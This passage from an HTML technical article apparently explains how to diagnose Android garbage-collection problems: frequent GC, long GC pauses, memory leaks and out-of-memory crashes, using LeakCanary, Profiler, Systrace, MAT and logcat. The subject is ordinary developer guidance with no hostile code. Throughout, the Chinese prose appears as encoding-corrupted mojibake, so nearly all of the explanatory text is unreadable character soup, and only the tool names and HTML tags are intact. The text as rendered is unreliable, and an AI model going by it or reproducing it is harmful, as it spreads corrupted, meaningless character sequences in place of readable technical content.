<li><strong>å¿«é€Ÿå‘ç°</strong>ï¼šèƒ½å¿«é€Ÿå‘ç°å†…å­˜æ³„æ¼ï¼Œæé«˜å¼€å‘æ•ˆç‡</li>
<li><strong>è¯¦ç»†è·¯å¾„</strong>ï¼šæ˜¾ç¤ºæ³„æ¼è·¯å¾„ï¼Œæ–¹ä¾¿å®šä½é—®é¢˜</li>
<li><strong>é€‚åˆå¼€å‘é˜¶æ®µ</strong>ï¼šåœ¨å¼€å‘é˜¶æ®µä½¿ç”¨ï¼ŒåŠæ—¶å‘ç°é—®é¢˜</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>LeakCanaryåªåœ¨debugç‰ˆæœ¬ä¸­ä½¿ç”¨</li>
<li>ä¸è¦åœ¨ç”Ÿäº§ç‰ˆæœ¬ä¸­ä½¿ç”¨ï¼ˆä¼šå½±å“æ€§èƒ½ï¼‰</li>
<li>LeakCanaryä¼šæ¶ˆè€—ä¸€å®šçš„å†…å­˜å’ŒCPUèµ„æº</li>
</ul>
<h4 data-id="heading-68">5.2 GCé—®é¢˜æ’æŸ¥æ–¹æ³•</h4>
<p><strong>è¯´æ˜ï¼šè¿™éƒ¨åˆ†ä»‹ç»å¦‚ä½•æ’æŸ¥å¸¸è§çš„GCé—®é¢˜ï¼ŒåŒ…æ‹¬è¯†åˆ«ã€åŸå› åˆ†æã€æ’æŸ¥æ­¥éª¤å’Œè§£å†³æ–¹æ¡ˆ</strong></p>
<h4 data-id="heading-69">5.2.1 GCé¢‘ç¹é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> GCè§¦å‘è¿‡äºé¢‘ç¹ï¼Œå½±å“åº”ç”¨æ€§èƒ½</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡logcatæŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>ä½¿ç”¨<code>adb logcat | grep GC</code>æŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡ä¸€æ®µæ—¶é—´å†…GCçš„æ¬¡æ•°</li>
<li>å¦‚æœGCè¿‡äºé¢‘ç¹ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰ï¼Œè¯´æ˜æœ‰é—®é¢˜</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡ProfileræŸ¥çœ‹GCäº‹ä»¶</strong></p>
<ul>
<li>åœ¨Android Studio Profilerä¸­æŸ¥çœ‹å†…å­˜æ›²çº¿</li>
<li>è§‚å¯ŸGCäº‹ä»¶çš„é¢‘ç‡</li>
<li>å¦‚æœGCäº‹ä»¶å¯†é›†ï¼Œè¯´æ˜GCé¢‘ç¹</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šGCé¢‘ç‡è¾ƒä½ï¼ˆæ¯”å¦‚å‡ ç§’ä¸€æ¬¡ï¼‰</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šGCé¢‘ç‡å¾ˆé«˜ï¼ˆæ¯”å¦‚æ¯ç§’å¤šæ¬¡ï¼‰</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šGCå‡ ä¹ä¸é—´æ–­ï¼Œä¸¥é‡å½±å“æ€§èƒ½</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<p><strong>1. é¢‘ç¹åˆ›å»ºå¯¹è±¡</strong></p>
<ul>
<li>ä»£ç ä¸­é¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li>æ¯”å¦‚ï¼šå¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡ã€åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡</li>
<li>å¯¼è‡´å¹´è½»ä»£å¿«é€Ÿå¡«æ»¡ï¼Œé¢‘ç¹è§¦å‘Partial GC</li>
</ul>
<p><strong>2. å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜ä¸è¶³</strong></p>
<ul>
<li>å†…å­˜æ³„æ¼å¯¼è‡´å†…å­˜é€æ¸è¢«å ç”¨</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿé¢‘ç¹è§¦å‘GCå°è¯•å›æ”¶å†…å­˜</li>
<li>ä½†æ³„æ¼çš„å¯¹è±¡æ— æ³•è¢«å›æ”¶ï¼ŒGCæ— æ•ˆ</li>
</ul>
<p><strong>3. å¹´è½»ä»£è®¾ç½®å¤ªå°ï¼ˆç³»ç»Ÿè‡ªåŠ¨ç®¡ç†ï¼Œé€šå¸¸ä¸æ˜¯é—®é¢˜ï¼‰</strong></p>
<ul>
<li>å¹´è½»ä»£å¤ªå°ï¼Œå®¹æ˜“å¡«æ»¡</li>
<li>å¡«æ»¡åé¢‘ç¹è§¦å‘Partial GC</li>
</ul>
<p><strong>4. å¤§å¯¹è±¡é¢‘ç¹åˆ†é…</strong></p>
<ul>
<li>é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡ï¼ˆæ¯”å¦‚å¤§å›¾ç‰‡ï¼‰</li>
<li>å¤§å¯¹è±¡å¯èƒ½ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
<li>å¯¼è‡´è€å¹´ä»£å¿«é€Ÿå¡«æ»¡ï¼Œé¢‘ç¹è§¦å‘Full GC</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤GCé¢‘ç‡</strong></p>
<ul>
<li>ä½¿ç”¨logcatæŸ¥çœ‹GCæ—¥å¿—</li>
<li>ç»Ÿè®¡GCé¢‘ç‡ï¼ˆæ¯”å¦‚ï¼š10ç§’å†…è§¦å‘äº†å‡ æ¬¡GCï¼‰</li>
<li>è®°å½•GCç±»å‹ï¼ˆPartial GCè¿˜æ˜¯Full GCï¼‰</li>
<li>è®°å½•GCè€—æ—¶</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨ProfileræŸ¥çœ‹å¯¹è±¡åˆ†é…æƒ…å†µ</strong></p>
<ul>
<li>ä½¿ç”¨Profilerçš„"Allocation Tracking"åŠŸèƒ½</li>
<li>è®°å½•ä¸€æ®µæ—¶é—´å†…çš„å¯¹è±¡åˆ†é…</li>
<li>æŸ¥çœ‹å“ªäº›å¯¹è±¡è¢«é¢‘ç¹åˆ†é…</li>
<li>æŸ¥çœ‹å¯¹è±¡åˆ†é…çš„è°ƒç”¨æ ˆ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„åœ°æ–¹</strong></p>
<ul>
<li>æ ¹æ®Profilerçš„åˆ†é…è®°å½•ï¼Œæ‰¾å‡ºé¢‘ç¹åˆ›å»ºå¯¹è±¡çš„ä»£ç ä½ç½®</li>
<li>å¸¸è§åœºæ™¯ï¼š
<ul>
<li>å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>åˆ—è¡¨æ»‘åŠ¨æ—¶åˆ›å»ºå¯¹è±¡ï¼ˆonBindViewHolderï¼‰</li>
<li>åŠ¨ç”»æ’­æ”¾æ—¶åˆ›å»ºå¯¹è±¡</li>
<li>ç½‘ç»œè¯·æ±‚æ—¶åˆ›å»ºå¯¹è±¡</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šåˆ†æä»£ç ï¼Œæ‰¾å‡ºåŸå› </strong></p>
<ul>
<li>åˆ†æä»£ç ï¼Œæ‰¾å‡ºä¸ºä»€ä¹ˆé¢‘ç¹åˆ›å»ºå¯¹è±¡</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>æ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šä¼˜åŒ–ä»£ç ï¼Œå‡å°‘å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–ä»£ç </li>
<li>ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</li>
<li>é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. ä½¿ç”¨å¯¹è±¡æ± å¤ç”¨å¯¹è±¡</strong></p>
<ul>
<li>å¯¹äºé¢‘ç¹åˆ›å»ºçš„å¯¹è±¡ï¼Œä½¿ç”¨å¯¹è±¡æ± </li>
<li>ç¤ºä¾‹ï¼šRecyclerViewçš„ViewHolderæ± ã€è‡ªå®šä¹‰å¯¹è±¡æ± </li>
</ul>
<p><strong>2. å‡å°‘ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</strong></p>
<ul>
<li>ä½¿ç”¨StringBuilderè€Œä¸æ˜¯å­—ç¬¦ä¸²æ‹¼æ¥</li>
<li>é¿å…åœ¨å¾ªç¯ä¸­åˆ›å»ºå¯¹è±¡</li>
<li>å¤ç”¨å­—ç¬¦ä¸²ã€é¿å…åˆ›å»ºä¸´æ—¶å¯¹è±¡</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œé‡Šæ”¾è¢«å ç”¨çš„å†…å­˜</li>
</ul>
<p><strong>4. ä¼˜åŒ–æ•°æ®ç»“æ„</strong></p>
<ul>
<li>é€‰æ‹©åˆé€‚çš„é›†åˆç±»</li>
<li>åŠæ—¶æ¸…ç†é›†åˆï¼Œé¿å…é›†åˆæ³„æ¼</li>
</ul>
<p><strong>5. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>é¿å…é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
<h4 data-id="heading-70">5.2.2 GCæš‚åœæ—¶é—´é•¿é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> GCæš‚åœæ—¶é—´è¿‡é•¿ï¼Œå¯¼è‡´åº”ç”¨å¡é¡¿</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡Systraceåˆ†æ</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹çš„æ‰§è¡Œæƒ…å†µ</li>
<li>å¦‚æœä¸»çº¿ç¨‹åœ¨GCæœŸé—´è¢«é˜»å¡ï¼Œè¯´æ˜GCæš‚åœæ—¶é—´é•¿</li>
<li>æŸ¥çœ‹GCçš„æŒç»­æ—¶é—´</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šé€šè¿‡ProfileræŸ¥çœ‹GCè€—æ—¶</strong></p>
<ul>
<li>åœ¨Profilerä¸­æŸ¥çœ‹GCäº‹ä»¶</li>
<li>ç‚¹å‡»GCäº‹ä»¶ï¼ŒæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
<li>æŸ¥çœ‹GCçš„æš‚åœæ—¶é—´ï¼ˆpaused timeï¼‰</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡logcatæŸ¥çœ‹GCæ—¥å¿—</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ä¸­çš„pausedæ—¶é—´</li>
<li>å¦‚æœpausedæ—¶é—´è¿‡é•¿ï¼ˆæ¯”å¦‚&gt;50msï¼‰ï¼Œä¼šå¯¼è‡´å¡é¡¿</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>Partial GC</strong>ï¼šæš‚åœæ—¶é—´é€šå¸¸å‡ æ¯«ç§’ï¼Œç”¨æˆ·åŸºæœ¬æ„Ÿè§‰ä¸åˆ°</li>
<li><strong>Full GC</strong>ï¼šæš‚åœæ—¶é—´å¯èƒ½å‡ ååˆ°å‡ ç™¾æ¯«ç§’ï¼Œç”¨æˆ·èƒ½æ„Ÿè§‰åˆ°å¡é¡¿</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šæš‚åœæ—¶é—´&gt;100msï¼Œæ˜æ˜¾å¡é¡¿</li>
</ul>
<p><strong>å¯èƒ½çš„åŸå› ï¼š</strong></p>
<p><strong>1. Full GCé¢‘ç¹è§¦å‘</strong></p>
<ul>
<li>Full GCçš„æš‚åœæ—¶é—´æ¯”Partial GCé•¿å¾—å¤š</li>
<li>å¦‚æœFull GCé¢‘ç¹è§¦å‘ï¼Œä¼šå¯¼è‡´é¢‘ç¹å¡é¡¿</li>
<li>åŸå› ï¼šå†…å­˜æ³„æ¼ã€è€å¹´ä»£å¯¹è±¡å¤ªå¤š</li>
</ul>
<p><strong>2. å †å†…å­˜å¤ªå¤§ï¼Œå›æ”¶æ—¶é—´é•¿</strong></p>
<ul>
<li>å †å†…å­˜è¶Šå¤§ï¼ŒGCéœ€è¦å¤„ç†çš„å¯¹è±¡è¶Šå¤š</li>
<li>å›æ”¶æ—¶é—´è¶Šé•¿ï¼Œæš‚åœæ—¶é—´è¶Šé•¿</li>
</ul>
<p><strong>3. è€å¹´ä»£å¯¹è±¡å¤ªå¤š</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å¤šï¼ŒFull GCæ—¶éœ€è¦å¤„ç†çš„å¯¹è±¡å¤š</li>
<li>å›æ”¶æ—¶é—´é•¿ï¼Œæš‚åœæ—¶é—´é•¿</li>
</ul>
<p><strong>4. å¤§å¯¹è±¡å¤ªå¤š</strong></p>
<ul>
<li>å¤§å¯¹è±¡å ç”¨å†…å­˜å¤šï¼Œå›æ”¶æ…¢</li>
<li>å½±å“GCæ€§èƒ½ï¼Œå¯¼è‡´æš‚åœæ—¶é—´é•¿</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šæŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤GCç±»å‹</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œç¡®è®¤æ˜¯Partial GCè¿˜æ˜¯Full GC</li>
<li>Partial GCæš‚åœæ—¶é—´çŸ­ï¼ŒFull GCæš‚åœæ—¶é—´é•¿</li>
<li>å¦‚æœFull GCé¢‘ç¹ï¼Œéœ€è¦é‡ç‚¹å…³æ³¨</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šåˆ†æGCè€—æ—¶</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ä¸­çš„pausedæ—¶é—´</li>
<li>å¦‚æœpausedæ—¶é—´è¿‡é•¿ï¼Œåˆ†æåŸå› </li>
<li>è®°å½•GCè€—æ—¶ï¼Œåˆ†æè¶‹åŠ¿</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šä½¿ç”¨Systraceåˆ†æGCå¯¹ä¸»çº¿ç¨‹çš„å½±å“</strong></p>
<ul>
<li>ä½¿ç”¨Systraceè®°å½•åº”ç”¨è¿è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹ä¸»çº¿ç¨‹åœ¨GCæœŸé—´çš„æ‰§è¡Œæƒ…å†µ</li>
<li>æŸ¥çœ‹GCæ˜¯å¦å¯¼è‡´ä¸»çº¿ç¨‹é˜»å¡</li>
<li>æŸ¥çœ‹GCæ˜¯å¦å¯¼è‡´å¸§ç‡ä¸‹é™</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šæ£€æŸ¥æ˜¯å¦æœ‰å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼Œé¢‘ç¹è§¦å‘Full GC</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼å¯ä»¥å‡å°‘Full GC</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šåˆ†æè€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>ä½¿ç”¨Profilerç”Ÿæˆå †è½¬å‚¨</li>
<li>åˆ†æè€å¹´ä»£ä¸­çš„å¯¹è±¡</li>
<li>æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„å¯¹è±¡</li>
<li>åˆ†æä¸ºä»€ä¹ˆè¿™äº›å¯¹è±¡åœ¨è€å¹´ä»£</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>ä¼˜åŒ–æ–¹æ¡ˆï¼š</strong></p>
<p><strong>1. é¿å…è§¦å‘Full GCï¼ˆæœ€é‡è¦ï¼‰</strong></p>
<ul>
<li>Full GCæš‚åœæ—¶é—´é•¿ï¼Œåº”è¯¥å°½é‡é¿å…</li>
<li>æ–¹æ³•ï¼š
<ul>
<li>é¿å…å†…å­˜æ³„æ¼ï¼ˆå†…å­˜æ³„æ¼ä¼šå¯¼è‡´è€å¹´ä»£æ»¡ï¼‰</li>
<li>å‡å°‘è€å¹´ä»£å¯¹è±¡</li>
<li>ä¸è¦æ˜¾å¼è°ƒç”¨System.gc()</li>
</ul>
</li>
</ul>
<p><strong>2. å‡å°‘è€å¹´ä»£å¯¹è±¡</strong></p>
<ul>
<li>å‡å°‘é•¿æœŸå­˜æ´»çš„å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾ä¸éœ€è¦çš„å¯¹è±¡</li>
<li>é¿å…å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£</li>
</ul>
<p><strong>3. ä¿®å¤å†…å­˜æ³„æ¼</strong></p>
<ul>
<li>ä½¿ç”¨LeakCanaryæ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>ä¿®å¤å†…å­˜æ³„æ¼ï¼Œé‡Šæ”¾è¢«å ç”¨çš„å†…å­˜</li>
<li>å‡å°‘Full GCçš„è§¦å‘</li>
</ul>
<p><strong>4. ä¼˜åŒ–å¤§å¯¹è±¡</strong></p>
<ul>
<li>é¿å…é¢‘ç¹åˆ›å»ºå¤§å¯¹è±¡</li>
<li>åŠæ—¶é‡Šæ”¾å¤§å¯¹è±¡</li>
<li>ä½¿ç”¨å¯¹è±¡æ± ç®¡ç†å¤§å¯¹è±¡</li>
</ul>
<p><strong>5. ä¼˜åŒ–GCæ€§èƒ½</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»ºï¼Œå‡å°‘GCé¢‘ç‡</li>
<li>è®©Partial GCæ›´é«˜æ•ˆ</li>
<li>é¿å…Full GC</li>
</ul>
<h4 data-id="heading-71">5.2.3 å†…å­˜æ³„æ¼é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> å†…å­˜æŒç»­å¢é•¿ï¼ŒGCæ— æ³•å›æ”¶ï¼Œæœ€ç»ˆå¯èƒ½å¯¼è‡´OOM</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šé€šè¿‡Profilerè§‚å¯Ÿå†…å­˜æ›²çº¿</strong></p>
<ul>
<li>åœ¨Profilerä¸­æŸ¥çœ‹å†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œä¸ä¸‹é™ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</li>
<li>æ­£å¸¸æƒ…å†µï¼šå†…å­˜ä¼šå‘¨æœŸæ€§ä¸Šå‡å’Œä¸‹é™ï¼ˆGCå›æ”¶ï¼‰</li>
<li>å¼‚å¸¸æƒ…å†µï¼šå†…å­˜æŒç»­ä¸Šå‡ï¼Œä¸ä¸‹é™</li>
</ul>
<p><strong>æ–¹æ³•2ï¼šä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹</strong></p>
<ul>
<li>LeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å‘ç°æ³„æ¼æ—¶ä¼šæ˜¾ç¤ºé€šçŸ¥</li>
<li>è¿™æ˜¯æœ€ç›´æ¥çš„æ–¹æ³•</li>
</ul>
<p><strong>æ–¹æ³•3ï¼šé€šè¿‡GCæ—¥å¿—åˆ†æ</strong></p>
<ul>
<li>æŸ¥çœ‹GCæ—¥å¿—ï¼Œå¦‚æœGCé¢‘ç¹ä½†å†…å­˜ä¸ä¸‹é™</li>
<li>è¯´æ˜GCæ— æ³•å›æ”¶å¯¹è±¡ï¼Œå¯èƒ½æœ‰å†…å­˜æ³„æ¼</li>
</ul>
<p><strong>åˆ¤æ–­æ ‡å‡†ï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸æƒ…å†µ</strong>ï¼šå†…å­˜ä¼šå‘¨æœŸæ€§ä¸Šå‡å’Œä¸‹é™</li>
<li><strong>å¼‚å¸¸æƒ…å†µ</strong>ï¼šå†…å­˜æŒç»­å¢é•¿ï¼Œä¸ä¸‹é™</li>
<li><strong>ä¸¥é‡æƒ…å†µ</strong>ï¼šå†…å­˜æŒç»­å¢é•¿ï¼Œæœ€ç»ˆOOM</li>
</ul>
<p><strong>è¯¦ç»†æ’æŸ¥æ­¥éª¤ï¼š</strong></p>
<p><strong>æ­¥éª¤1ï¼šä½¿ç”¨LeakCanaryè‡ªåŠ¨æ£€æµ‹ï¼ˆæ¨èï¼‰</strong></p>
<ul>
<li>åœ¨å¼€å‘é˜¶æ®µï¼ŒLeakCanaryä¼šè‡ªåŠ¨æ£€æµ‹å†…å­˜æ³„æ¼</li>
<li>å¦‚æœå‘ç°æ³„æ¼ï¼Œä¼šæ˜¾ç¤ºé€šçŸ¥å’Œæ³„æ¼è·¯å¾„</li>
<li>æ ¹æ®æ³„æ¼è·¯å¾„ï¼Œå¯ä»¥å¿«é€Ÿå®šä½é—®é¢˜</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°ï¼Œæ˜¾ç¤ºæ³„æ¼è·¯å¾„</li>
</ul>
<p><strong>æ­¥éª¤2ï¼šä½¿ç”¨Profilerè§‚å¯Ÿå†…å­˜è¶‹åŠ¿</strong></p>
<ul>
<li>åœ¨Profilerä¸­è§‚å¯Ÿå†…å­˜ä½¿ç”¨æ›²çº¿</li>
<li>å¦‚æœå†…å­˜æŒç»­å¢é•¿ï¼Œè®°å½•å†…å­˜å¢é•¿çš„æ—¶é—´ç‚¹</li>
<li>åˆ†æåœ¨ä»€ä¹ˆæ“ä½œåå†…å­˜å¼€å§‹å¢é•¿</li>
<li>æ‰¾å‡ºå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼çš„æ“ä½œ</li>
</ul>
<p><strong>æ­¥éª¤3ï¼šç”Ÿæˆå †è½¬å‚¨</strong></p>
<ul>
<li>åœ¨å†…å­˜å¢é•¿åï¼Œç”Ÿæˆå †è½¬å‚¨</li>
<li>å¯ä»¥ç”Ÿæˆå¤šä¸ªå †è½¬å‚¨ï¼Œå¯¹æ¯”åˆ†æ</li>
<li>å¯¼å‡ºä¸ºhprofæ–‡ä»¶</li>
</ul>
<p><strong>æ­¥éª¤4ï¼šä½¿ç”¨MATåˆ†æå †è½¬å‚¨</strong></p>
<ul>
<li>ç”¨MATæ‰“å¼€å †è½¬å‚¨æ–‡ä»¶</li>
<li>ä½¿ç”¨"Histogram"æ‰¾å‡ºå ç”¨å†…å­˜æœ€å¤šçš„ç±»</li>
<li>ä½¿ç”¨"Dominator Tree"æŸ¥çœ‹å¯¹è±¡å¼•ç”¨å…³ç³»</li>
<li>ä½¿ç”¨"Path to GC Roots"æ‰¾å‡ºå¼•ç”¨é“¾</li>
</ul>
<p><strong>æ­¥éª¤5ï¼šæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</strong></p>
<ul>
<li>æ ¹æ®MATçš„åˆ†æç»“æœï¼Œæ‰¾å‡ºæ— æ³•å›æ”¶çš„å¯¹è±¡</li>
<li>åˆ†æè¿™äº›å¯¹è±¡ä¸ºä»€ä¹ˆæ— æ³•è¢«å›æ”¶</li>
<li>æ‰¾å‡ºæ˜¯å“ªä¸ªå¯¹è±¡æŒæœ‰è¿™äº›å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>æ­¥éª¤6ï¼šåˆ†æå¼•ç”¨é“¾ï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </strong></p>
<ul>
<li>ä½¿ç”¨MATçš„"Path to GC Roots"åŠŸèƒ½</li>
<li>æŸ¥çœ‹å¯¹è±¡çš„å¼•ç”¨é“¾</li>
<li>æ‰¾å‡ºæ³„æ¼çš„åŸå› ï¼š
<ul>
<li>é™æ€å˜é‡æŒæœ‰ï¼Ÿ</li>
<li>ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œï¼Ÿ</li>
<li>é›†åˆç±»æ³„æ¼ï¼Ÿ</li>
<li>å…¶ä»–åŸå› ï¼Ÿ</li>
</ul>
</li>
</ul>
<p><strong>æ­¥éª¤7ï¼šä¿®å¤ä»£ç </strong></p>
<ul>
<li>æ ¹æ®åˆ†æç»“æœï¼Œä¿®å¤ä»£ç </li>
<li>å¸¸è§ä¿®å¤æ–¹æ³•ï¼š
<ul>
<li>ä½¿ç”¨å¼±å¼•ç”¨ï¼ˆWeakReferenceï¼‰</li>
<li>åŠæ—¶æ¸…ç†èµ„æºï¼ˆonDestroyä¸­æ¸…ç†ï¼‰</li>
<li>å–æ¶ˆæ³¨å†Œç›‘å¬å™¨</li>
<li>æ¸…ç†é›†åˆ</li>
</ul>
</li>
</ul>
<p><strong>å¸¸è§æ³„æ¼åœºæ™¯ï¼š</strong></p>
<p><strong>1. Activity/Contextæ³„æ¼</strong></p>
<ul>
<li>é™æ€å˜é‡æŒæœ‰Activityå¼•ç”¨</li>
<li>å•ä¾‹æŒæœ‰Activity Contextå¼•ç”¨</li>
<li>HandleræŒæœ‰Activityå¼•ç”¨</li>
</ul>
<p><strong>2. ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</strong></p>
<ul>
<li>EventBusæœªå–æ¶ˆæ³¨å†Œ</li>
<li>å¹¿æ’­æ¥æ”¶å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
<li>å…¶ä»–ç›‘å¬å™¨æœªå–æ¶ˆæ³¨å†Œ</li>
</ul>
<p><strong>3. é›†åˆç±»æ³„æ¼</strong></p>
<ul>
<li>Listã€Mapä¸­ä¿å­˜äº†ä¸å†ä½¿ç”¨çš„å¯¹è±¡</li>
<li>é›†åˆæŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œå¯¹è±¡æ— æ³•è¢«å›æ”¶</li>
</ul>
<p><strong>4. çº¿ç¨‹æ³„æ¼</strong></p>
<ul>
<li>çº¿ç¨‹æŒæœ‰å¯¹è±¡å¼•ç”¨ï¼Œçº¿ç¨‹ä¸ç»“æŸï¼Œå¯¹è±¡æ— æ³•å›æ”¶</li>
<li>AsyncTaskã€HandlerThreadç­‰</li>
</ul>
<p><strong>5. èµ„æºæœªå…³é—­</strong></p>
<ul>
<li>æ–‡ä»¶ã€æ•°æ®åº“è¿æ¥ã€ç½‘ç»œè¿æ¥ç­‰æœªå…³é—­</li>
<li>å¯¼è‡´èµ„æºæ³„æ¼</li>
</ul>
<p><strong>æ’æŸ¥å·¥å…·ï¼š</strong></p>
<ul>
<li><strong>LeakCanary</strong>ï¼šè‡ªåŠ¨æ£€æµ‹ï¼Œå¿«é€Ÿå‘ç°æ³„æ¼</li>
<li><strong>MAT</strong>ï¼šè¯¦ç»†åˆ†æï¼Œæ‰¾å‡ºæ³„æ¼åŸå› </li>
<li><strong>Android Studio Profiler</strong>ï¼šå®æ—¶ç›‘æ§ï¼Œè§‚å¯Ÿå†…å­˜è¶‹åŠ¿</li>
</ul>
<h4 data-id="heading-72">5.2.4 å†…å­˜æº¢å‡ºï¼ˆOOMï¼‰é—®é¢˜æ’æŸ¥</h4>
<p><strong>é—®é¢˜æè¿°ï¼š</strong> åº”ç”¨å´©æºƒï¼Œæ—¥å¿—æ˜¾ç¤ºOutOfMemoryError</p>
<p><strong>å¦‚ä½•è¯†åˆ«ï¼š</strong></p>
<p><strong>æ–¹æ³•1ï¼šåº”ç”¨å´©æºƒï¼ŒæŸ¥çœ‹æ—¥å¿—</strong></p>
<ul>
<li>åº”ç”¨å´©æºƒæ—¶ï¼ŒæŸ¥çœ‹logcatæ—¥å¿—</li>
